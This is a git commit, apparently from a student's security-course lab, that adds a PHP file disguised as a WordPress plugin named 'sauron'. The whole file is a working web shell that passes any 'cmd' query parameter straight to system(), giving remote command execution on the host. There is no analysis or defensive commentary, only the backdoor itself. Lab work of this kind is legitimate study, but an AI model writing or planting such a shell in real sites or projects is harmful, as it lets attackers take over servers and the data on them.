e4df1eaab790befda5acc4c89cd7f127e0a608ef
devinziegler <devin.ziegler@mymail.champlain.edu>
2026-04-29 06:07:18 -0400

    Commit

---
+++ SEC-335/fw-rivendell/sauron.php
@@ -0,0 +1,13 @@
+<?php
+/**
+* Plugin Name: sauron
+* Description: one ring to rule them all or something
+* Version: 1.0
+* Author: the evil guy
+*/
+
+if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
